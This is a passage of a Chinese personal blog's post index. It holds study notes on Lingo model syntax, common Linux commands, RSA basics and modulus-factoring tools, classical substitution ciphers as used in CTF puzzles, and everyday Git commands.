表示值</p><p>设定集中所有成员的属性为同一数组</p><p>未知数值的设定:在求解时需要某些成员值为未知,采用设定未知值的方法,以相连逗号表示，逗号间可有空格</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//参数:</span></span><br><span class="line">data:</span><br><span class="line">  interest_rate = <span class="number">.085</span>;</span><br><span class="line">enddata</span><br><span class="line"><span class="comment">//可同时指定多个参数</span></span><br><span class="line">data:</span><br><span class="line">  interest_rate,inflation_rate = <span class="number">.085</span> <span class="number">.03</span>;</span><br><span class="line">enddata</span><br><span class="line"></span><br><span class="line"><span class="comment">//实时数据处理 在每一次求解模型时，Lingo会弹出对话框填入参数</span></span><br><span class="line">data:</span><br><span class="line">    interest_rate,inflation_rate = <span class="number">.085</span> ?;</span><br><span class="line">enddata</span><br><span class="line">    </span><br><span class="line"><span class="comment">//设定集中所有成员的属性</span></span><br><span class="line">sets:</span><br><span class="line">  days /MO,TU,WE,TH,FR,SA,SU/:needs,cost;</span><br><span class="line">endsets</span><br><span class="line">data:</span><br><span class="line">  needs cost= <span class="number">20</span> <span class="number">100</span>;  <span class="comment">//这将设定days集中MO,TU等全部成员的need属性为20，cost属性为100</span></span><br><span class="line">enddata</span><br><span class="line">    </span><br><span class="line"><span class="comment">//未知值的设定</span></span><br><span class="line">sets:</span><br><span class="line">  years/<span class="number">1.</span><span class="number">.5</span>/: capacity;</span><br><span class="line">endsets</span><br><span class="line">data:</span><br><span class="line">  capacity = ,<span class="number">34</span>,<span class="number">20</span>,,;</span><br><span class="line">enddata</span><br></pre></td></tr></table></figure><h4 id="3-初始部分"><a href="#3-初始部分" class="headerlink" title="3.初始部分"></a>3.初始部分</h4><p>初始部分输入的值仅被作为Lingo求解过程中的初始点来用，只对非线性模型有用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">init:</span><br><span class="line">  X, Y = <span class="number">0</span>, <span class="number">.1</span>;</span><br><span class="line">endinit</span><br><span class="line">Y=@<span class="built_in">log</span>(X);</span><br><span class="line">X^<span class="number">2</span>+Y^<span class="number">2</span>&lt;=<span class="number">1</span>;  <span class="comment">//求解该问题时，好的初始点会减小模型的求解时间</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Lingo </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用命令</title>
      <link href="/2020/09/04/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2020/09/04/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>这里记录一些平时常用的Linux命令</p><h4 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h4><p><code>cat file</code>显示文件内容</p><h4 id="cd"><a href="#cd" class="headerlink" title="cd"></a>cd</h4><p><code>cd -</code>可以在最近两次目录之间来回切换</p><h4 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h4><p><code>cp src dst</code>复制文件</p><p><code>cp -r src dst</code>复制文件夹</p><h4 id="df"><a href="#df" class="headerlink" title="df"></a>df</h4><p><code>df -h</code>查看磁盘空间</p><h4 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h4><p>筛选命令，如果想查找当前目录下的md文件可以<code>ls -lh | grep .md</code></p><h4 id="kill"><a href="#kill" class="headerlink" title="kill"></a>kill</h4><p><code>kill PID</code>根据 PID 杀死进程</p><h4 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h4><p><code>ls-lh</code>可以列出当前目录列出当前目录下文件的详细信息，效果等同<code>ll</code></p><h4 id="man"><a href="#man" class="headerlink" title="man"></a>man</h4><p><code>man command</code>可以查看某个命令的帮助文档，按q退出</p><h4 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a>mkdir</h4><p><code>mkdir dir_name</code>可以创建一个目录</p><p><code>mkdir -p dir_name/xxx/xxx</code>可以递归创建目录</p><h4 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h4><p><code>pwd</code>命令以绝对路径的方式显示用户当前的工作目录</p><h4 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h4><p><code>tar -cvf file.tar dir</code>打包文件夹</p><p><code>tar -xvf file.tar</code>解包</p><p><code>tar -czvf file.tar.gz dir</code>压缩文件夹</p><p><code>tar -zxvf file.tar.gz</code>解压</p><h4 id="top"><a href="#top" class="headerlink" title="top"></a>top</h4><p>实时查看系统运行状态，CPU、内存、进程等信息</p><h4 id="touch"><a href="#touch" class="headerlink" title="touch"></a>touch</h4><p><code>touch file_name</code>用来创建文件。如果文件已存在，则会修改文件的末次修改时间</p><h4 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h4><p><code>unzip file.zip</code>解压由<code>zip</code>命令压缩的<code>.zip</code>文件</p><h4 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h4><p><code>wget url</code>从指定 url 下载文件</p><h4 id="whereis"><a href="#whereis" class="headerlink" title="whereis"></a>whereis</h4><p>查找含有特定关键字的文件，如<code>whereis python</code></p><h4 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h4><p><code>zip file.zip file</code>压缩文件</p><p><code>zip dir.zip -r dir</code>压缩文件夹</p><h4 id="重定向-gt-和-gt-gt"><a href="#重定向-gt-和-gt-gt" class="headerlink" title="重定向 &gt; 和 &gt;&gt;"></a>重定向 &gt; 和 &gt;&gt;</h4><p>在Linux中可以将命令执行的结果重定向到一个文件</p><p>即本应显示在终端上的内容<strong>输出／追加</strong>到指定文件中</p><ul><li><code>&gt;</code>表示输出，会覆盖原有文件</li><li><code>&gt;&gt;</code>表示追加，会将内容追加到已有文件的末尾</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">将ls命令的输出结果保存到test.txt中</span><br><span class="line"></span><br><span class="line">ls &gt; test.txt   <span class="comment">##（test.txt如果不存在则创建，存在则覆盖其内容）。</span></span><br><span class="line">ls &gt;&gt; test.txt  <span class="comment">##（test.txt如果不存在则创建，存在则在后面追加输出内容）。</span></span><br></pre></td></tr></table></figure><p>重定向非常重要，有些时候我们要同时打开两个终端，比如在一个终端中跑任务，在另一个终端是看不到输出的，但是如果我们把输出重定向到一个文件中，那么另一个终端就可以打开这个文件查看数据了</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Crypto学习笔记(浅谈RSA)</title>
      <link href="/2020/09/02/RSA/"/>
      <url>/2020/09/02/RSA/</url>
      
        <content type="html"><![CDATA[<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>通信技术是为了实现信息的传输，但为了实现信息传输的安全性，则需要对信息进行加密。$RSA$就是当下的主流加密方式。</p><p>凯撒密码是一种对称加密，加密解密使用了同种规则，即<strong>明文+密钥-&gt;密文 密文-密钥-&gt;明文</strong> 。在整个过程中传输的密钥是不变的，通信双方都需要知道密钥，这就会增大了传输过程中密钥泄露的风险。而$RSA$是一种非对称加密 加密解密采用了不同规则，即 <strong>明文+公钥-&gt;密文 密文+私钥-&gt;明文</strong>。公钥是公开的，而私钥则只要保留在信息的接受者手中，这就一定程度保证了信息传输的安全性。</p><h4 id="加密解密原理"><a href="#加密解密原理" class="headerlink" title="加密解密原理"></a>加密解密原理</h4><script type="math/tex; mode=display">加密 \qquad  c\equiv m^e \mod n \\\\解密 \qquad  m\equiv c^d \mod n</script><p>其中$m$为明文  $c$为密文</p><p>给定公钥$KU (e,n)$ 实现加密 给定私钥$KR (d,n)$ 实现解密</p><h4 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h4><p>1.寻找两个不等的质数$p$,$ q$</p><p>2.$n=pq$</p><p>3.欧拉函数$\phi(n)=(p-1)(q-1)$  <strong><em>表示小于等于n的数中与n互质的数的数目</em></strong></p><p>4.确定e     $1&lt;e&lt;\phi(n) $      $e与\phi(n)$互质      即$gcd(e,\phi(n))=1$</p><p>5.确定d     $de \mod \phi(n)=1$    即 $de=k\phi(n)+1,k\ge1$</p><h4 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h4><p>整个加密过程的安全性在于 找到两个很大的质数相乘得到的一个数很容易，但要将一个很大的数分解为两个质数则基本不可能实现。至少在量子计算机出现之前，2048位的$RSA$加密极其安全。</p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html">http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html</a></p><p><a href="https://xz.aliyun.com/t/2446#toc-5">https://xz.aliyun.com/t/2446#toc-5</a></p><h4 id="分解n"><a href="#分解n" class="headerlink" title="分解n"></a>分解n</h4><h5 id="在线分解"><a href="#在线分解" class="headerlink" title="在线分解"></a>在线分解</h5><h5 id="http-factordb-com"><a href="#http-factordb-com" class="headerlink" title="http://factordb.com"></a><a href="http://factordb.com">http://factordb.com</a></h5><h5 id="yafu分解"><a href="#yafu分解" class="headerlink" title="yafu分解"></a>yafu分解</h5><p>yafu​下载地址 <a href="https://sourceforge.net/projects/yafu/">https://sourceforge.net/projects/yafu/</a></p><p>启动<code>yafu-x64.exe</code>键入<code>factor($n)</code>,结果将保存在<code>factor.log</code>文件中</p><p>或者<code>cd</code>到根目录下，执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yafu-x64.exe factor(<span class="variable">$n</span>)</span><br></pre></td></tr></table></figure><p>其中$n$为模数。</p><p>yafu分解从文件读取，将n置于1.txt中，注意最后需要换行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yafu-x64 &quot;factor(@)&quot; -batchfile 1.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Crypto学习笔记(替换密码-图形替换)</title>
      <link href="/2020/09/01/Crypto%E7%AC%94%E8%AE%B0-%E6%9B%BF%E6%8D%A2%E5%8A%A0%E5%AF%86-%E5%9B%BE%E5%BD%A2%E6%9B%BF%E6%8D%A2/"/>
      <url>/2020/09/01/Crypto%E7%AC%94%E8%AE%B0-%E6%9B%BF%E6%8D%A2%E5%8A%A0%E5%AF%86-%E5%9B%BE%E5%BD%A2%E6%9B%BF%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<h4 id="猪圈密码"><a href="#猪圈密码" class="headerlink" title="猪圈密码"></a>猪圈密码</h4><p>特点：</p><p><img src="/2020/09/01/Crypto%E7%AC%94%E8%AE%B0-%E6%9B%BF%E6%8D%A2%E5%8A%A0%E5%AF%86-%E5%9B%BE%E5%BD%A2%E6%9B%BF%E6%8D%A2/1.png" alt></p><p>各字母对应位置的格子形状，就是对应符号</p><p>密码表:</p><p><img src="/2020/09/01/Crypto%E7%AC%94%E8%AE%B0-%E6%9B%BF%E6%8D%A2%E5%8A%A0%E5%AF%86-%E5%9B%BE%E5%BD%A2%E6%9B%BF%E6%8D%A2/2.png" alt></p><h5 id="圣党武士密码"><a href="#圣党武士密码" class="headerlink" title="圣党武士密码"></a>圣党武士密码</h5><p>猪圈密码的变种</p><h4 id><a href="#" class="headerlink" title></a><img src="/2020/09/01/Crypto%E7%AC%94%E8%AE%B0-%E6%9B%BF%E6%8D%A2%E5%8A%A0%E5%AF%86-%E5%9B%BE%E5%BD%A2%E6%9B%BF%E6%8D%A2/3.png" alt></h4><h4 id="夏多密码"><a href="#夏多密码" class="headerlink" title="夏多密码"></a>夏多密码</h4><p>类似指针钟表</p><p>I AM IN DANGER.SEND HELP(我有危险，速来增援)可以加密成</p><p><img src="/2020/09/01/Crypto%E7%AC%94%E8%AE%B0-%E6%9B%BF%E6%8D%A2%E5%8A%A0%E5%AF%86-%E5%9B%BE%E5%BD%A2%E6%9B%BF%E6%8D%A2/4.png" alt></p><h4 id="标准银河密码"><a href="#标准银河密码" class="headerlink" title="标准银河密码"></a>标准银河密码</h4><p><img src="/2020/09/01/Crypto%E7%AC%94%E8%AE%B0-%E6%9B%BF%E6%8D%A2%E5%8A%A0%E5%AF%86-%E5%9B%BE%E5%BD%A2%E6%9B%BF%E6%8D%A2/5.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Crypto学习笔记(替换密码)</title>
      <link href="/2020/09/01/%E6%9B%BF%E6%8D%A2%E5%AF%86%E7%A0%81/"/>
      <url>/2020/09/01/%E6%9B%BF%E6%8D%A2%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h4 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h4><p>特点:偏移 偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。</p><p>解密:<a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">https://www.qqxiuzi.cn/bianma/kaisamima.php</a></p><h4 id="ROT编码"><a href="#ROT编码" class="headerlink" title="ROT编码"></a>ROT编码</h4><p>ROT5：只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，例如当前为0，编码后变成5，当前为1，编码后变成6，以此类推顺序循环。<br>ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环。<br>ROT18：这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，为了好称呼，将其命名为ROT18。<br>ROT47：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，例如当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_。用于ROT47编码的字符其ASCII值范围是33－126，具体可参考ASCII编码</p><p>特点:SYNT对应flag，如出现SYNT，考虑ROT13</p><p>解码:<a href="https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php">https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php</a></p><h4 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h4><p>加密函数：E<strong>(x) = (ax + b) (mod m)</strong>，其中 a与b互质，m是编码系统中字母的个数（通常都是26）。</p><p>解码:参考<a href="https://www.bilibili.com/read/cv7239750?share_medium=android&amp;share_source=qq&amp;bbid=XYB56C7BD51ABD9385155A829D469004D95C4&amp;ts=1598792363340">https://www.bilibili.com/read/cv7239750?share_medium=android&amp;share_source=qq&amp;bbid=XYB56C7BD51ABD9385155A829D469004D95C4&amp;ts=1598792363340</a></p><h4 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h4><p>特点:多表密码 需要密钥</p><p>解码+介绍:<a href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php">https://www.qqxiuzi.cn/bianma/weijiniyamima.php</a></p><h4 id="埃特巴什码"><a href="#埃特巴什码" class="headerlink" title="埃特巴什码"></a>埃特巴什码</h4><p>特点:它使用字母表中的最后一个字母代表第一个字母，倒数第二个字母代表第二个字母。</p><p>解码:<a href="https://quipqiup.com/">https://quipqiup.com/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pycipher <span class="keyword">import</span> Atbash</span><br><span class="line">Atbash().encipher(<span class="string">&#x27;&#x27;</span>) //加密</span><br><span class="line">Atbash().decipher(<span class="string">&#x27;&#x27;</span>) //解密</span><br></pre></td></tr></table></figure><h4 id="希尔密码"><a href="#希尔密码" class="headerlink" title="希尔密码"></a>希尔密码</h4><p>特点：运用基本矩阵论原理的替换密码</p><p>详细介绍：<a href="https://www.cnblogs.com/xdjun/p/7472735.html">https://www.cnblogs.com/xdjun/p/7472735.html</a></p><p><a href="https://blog.csdn.net/roc1010/article/details/106315571/">https://blog.csdn.net/roc1010/article/details/106315571/</a></p><h4 id="波利比奥斯方阵密码"><a href="#波利比奥斯方阵密码" class="headerlink" title="波利比奥斯方阵密码"></a>波利比奥斯方阵密码</h4><p>常见方阵</p><div class="table-container"><table><thead><tr><th></th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th></tr></thead><tbody><tr><td>1</td><td>A</td><td>B</td><td>C</td><td>D</td><td>E</td></tr><tr><td>2</td><td>F</td><td>G</td><td>H</td><td>I/J</td><td>K</td></tr><tr><td>3</td><td>L</td><td>M</td><td>N</td><td>O</td><td>P</td></tr><tr><td>4</td><td>Q</td><td>R</td><td>S</td><td>T</td><td>U</td></tr><tr><td>5</td><td>V</td><td>W</td><td>X</td><td>Y</td><td>Z</td></tr></tbody></table></div><p>其中I和J表示的坐标一样</p><p>要表达单词“HELP”，则写成密码就是23 15 31 35。</p><h4 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h4><p>特点:每个字母都会转换成一组五个英文字母，本质上类似于二进制<br>如a被替换为aaaaa，b被替换为aaaab，z被替换为bbaab</p><p>解码:<a href="https://tool.bugku.com/peigen/">https://tool.bugku.com/peigen/</a></p><h4 id="自动密钥密码"><a href="#自动密钥密码" class="headerlink" title="自动密钥密码"></a>自动密钥密码</h4><p>与维吉尼亚密码类似，区别在于密钥不同。它的密钥开头是一个关键词，之后则是明文的重复。</p><p>详细:<a href="https://baike.baidu.com/item/%E8%87%AA%E5%8A%A8%E5%AF%86%E9%92%A5%E5%AF%86%E7%A0%81/12612498?fr=aladdin">https://baike.baidu.com/item/%E8%87%AA%E5%8A%A8%E5%AF%86%E9%92%A5%E5%AF%86%E7%A0%81/12612498?fr=aladdin</a></p><p>解码:<a href="http://www.atoolbox.net/Tool.php?Id=920">http://www.atoolbox.net/Tool.php?Id=920</a></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Git笔记</title>
      <link href="/2020/08/31/Git%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/08/31/Git%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h4 id="Git的工作流"><a href="#Git的工作流" class="headerlink" title="Git的工作流"></a>Git的工作流</h4><p>工作区(working directory)：即当前分支所修改的代码，git add xx 之前的。</p><p>暂存区(staging area)：已经 git add 但未 git commit 的。</p><p>版本库(repository)：已经git commit 提交到本地分支的。</p><h4 id="Git的全局配置"><a href="#Git的全局配置" class="headerlink" title="Git的全局配置"></a>Git的全局配置</h4><p>第一次安装完git后需要对git进行基础信息的配置，告诉git：我是谁?也就是初始化操作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git config -l <span class="comment">#查看配置信息</span></span><br><span class="line">$ git config --global -l <span class="comment">#查看全局配置信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置全局信息：用户名和邮箱</span></span><br><span class="line">$ git config --global user.name <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">$ git config --global user.email <span class="string">&#x27;xxx@xxx.xxx&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git init <span class="comment">#初始化本地版本库</span></span><br><span class="line"><span class="comment">#会生成一个隐藏文件夹&quot;.git&quot;(其中包含暂存区和历史去还有一些其它的信息,绝对不能删)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#也可以通过如下操作</span></span><br><span class="line">$ git <span class="built_in">clone</span> &lt;url&gt; <span class="comment">#克隆远程版本库        </span></span><br></pre></td></tr></table></figure><h4 id="修改与提交"><a href="#修改与提交" class="headerlink" title="修改与提交"></a>修改与提交</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ git add xxx <span class="comment">#把当前仓库中某一个文件或者文件夹提交到暂存区</span></span><br><span class="line">$ git add . <span class="comment">#把当前仓库中所有最新修改的文件都提交到暂存区</span></span><br><span class="line">// 如果想忽略某个文件，需要新建一个.gitignore文件,写入想忽略的文件名称</span><br><span class="line">$ git add -A 同上</span><br><span class="line"></span><br><span class="line">$ git status <span class="comment">#查看当前文件的状态（红色代表在工作区，绿色代表在暂存区，看不见东西证明所有所有修改的内容都已提交到版本库）</span></span><br><span class="line"></span><br><span class="line">$ git commit -m<span class="string">&#x27;相关描述&#x27;</span></span><br><span class="line">如 git commit -m <span class="string">&#x27;my first demo&#x27;</span></span><br><span class="line"></span><br><span class="line">$ git mv &lt;old&gt; &lt;new&gt; <span class="comment">#文件重命名</span></span><br><span class="line"></span><br><span class="line">$ git rm &lt;file&gt; <span class="comment">#删除文件</span></span><br></pre></td></tr></table></figure><h4 id="代码回滚"><a href="#代码回滚" class="headerlink" title="代码回滚"></a>代码回滚</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看历史版本信息（历史记录）</span></span><br><span class="line">$ git <span class="built_in">log</span></span><br><span class="line">$ git reflog <span class="comment">#包含回滚的信息</span></span><br><span class="line">$ git <span class="built_in">log</span> -x <span class="comment">#查看最新的x个版本信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#版本号通过 git log查看</span></span><br><span class="line">$ git reset --hard &lt;版本号&gt;<span class="comment">#将版本库中的某一版本回滚到工作区</span></span><br><span class="line"></span><br><span class="line">$ git reset --soft &lt;版本号&gt;<span class="comment">#将版本库中的某一版本回滚到暂存区</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$git</span> reset --hard HEAD^ <span class="comment">#回滚到上个版本</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$git</span> reset --hard HEAD^~2 <span class="comment">#回滚到前两个版本</span></span><br></pre></td></tr></table></figure><p><img src="/2020/08/31/Git%E7%AC%94%E8%AE%B0/Git流程.png" alt></p><h4 id="远程操作"><a href="#远程操作" class="headerlink" title="远程操作"></a>远程操作</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ git remote -v <span class="comment">#查看远程版本库信息</span></span><br><span class="line"></span><br><span class="line">$ git remote add &lt;remote&gt; &lt;url&gt; <span class="comment">#添加远程版本库 其中的&lt;remote&gt;是随便起的一个连接名，可以改，不过一般都用origin 如下</span></span><br><span class="line">$ git remote add origin &lt;Git远程仓库地址&gt;</span><br><span class="line"></span><br><span class="line">$ git remote rm origin <span class="comment">#删除连接</span></span><br><span class="line">$ git remote show &lt;remote&gt; <span class="comment">#查看指定远程版本库信息</span></span><br><span class="line"></span><br><span class="line">$ git pull &lt;remote&gt; &lt;branch&gt; <span class="comment">#下载代码及快速合并</span></span><br><span class="line">$ git push &lt;remote&gt; &lt;branch&gt; <span class="comment">#上传代码及快速合并</span></span><br><span class="line"></span><br><span class="line">$ git fetch &lt;remote&gt; <span class="comment">#从远程库获取代码</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#git clone解决了三件事：初始化仓库、和对应远程仓库保持关联、把远程仓库内容拉取到本地</span></span><br><span class="line">$ git <span class="built_in">clone</span> &lt;Git远程仓库地址&gt; [别名（不写默认是仓库名）]</span><br></pre></td></tr></table></figure><h4 id="分支操作"><a href="#分支操作" class="headerlink" title="分支操作"></a>分支操作</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ git branch <span class="comment">#查看当前仓库分支</span></span><br><span class="line"></span><br><span class="line">$ git branch &lt;分支名&gt; <span class="comment">#创建分支</span></span><br><span class="line"></span><br><span class="line">$ git checkout &lt;分支名&gt; <span class="comment">#切换分支</span></span><br><span class="line"></span><br><span class="line">$ git merge &lt;分支名&gt; <span class="comment">#合并分支（要先切换到master分支）</span></span><br><span class="line"></span><br><span class="line">$ git branch -d &lt;分支名&gt; <span class="comment">#删除分支</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="标签操作"><a href="#标签操作" class="headerlink" title="标签操作"></a>标签操作</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#tag就像是指向commit的一个指针 如果想找到某个版本 确定其commit号为asdfg1h... 这样的字母数字序列就不好找，而tag查看就简单多了 按tag v1查找版本号为v1的commit就方便许多 tag的创建与删除都是实时完成的   </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#不过，如果不存在重要的提交，在日常使用中commit足以</span></span><br><span class="line">$ git tag <span class="comment">#列出所有本地标签</span></span><br><span class="line"></span><br><span class="line">$ git tag &lt;tagname&gt; <span class="comment">#基于最新提交创建标签</span></span><br><span class="line"></span><br><span class="line">$ git tag -d &lt;tagname&gt; <span class="comment">#删除标签</span></span><br></pre></td></tr></table></figure><h4 id="删除远程仓库，不删除本地仓库"><a href="#删除远程仓库，不删除本地仓库" class="headerlink" title="删除远程仓库，不删除本地仓库"></a>删除远程仓库，不删除本地仓库</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$git</span> pull origin master <span class="comment">#将远程仓库里面的项目拉下来</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> <span class="comment"># 查看有哪些文件夹</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$git</span> rm -r --cached filename <span class="comment">#删除文件 cached删除远程仓库而不删除本地文件</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$git</span> commit -m <span class="string">&#x27;远程删除filename’</span></span><br></pre></td></tr></table></figure><h4 id="实现Gitee与Github同步"><a href="#实现Gitee与Github同步" class="headerlink" title="实现Gitee与Github同步"></a>实现Gitee与Github同步</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#对于较少分支的仓库</span></span><br><span class="line"><span class="variable">$git</span> remote add gitee git@gitee.com:xxx/xxx.git <span class="comment">#添加Gitee仓库</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$git</span> pull 远程分支 分支名 <span class="comment">#从Github拉取代码 eg.git pull origin master</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$git</span> push gitee master <span class="comment">#推送本地代码到Gitee</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#对于较多分支的仓库参考 https://gitee.com/help/articles/4284#article-header0</span></span><br></pre></td></tr></table></figure><h4 id="学习网站"><a href="#学习网站" class="headerlink" title="学习网站"></a>学习网站</h4><p><a href="https://learngitbranching.js.org/?locale=zh_CN">https://learngitbranching.js.org/?locale=zh_CN</a></p><p><a href="https://www.liaoxuefeng.com/wiki/896043488029600">https://www.liaoxuefeng.com/wiki/896043488029600</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
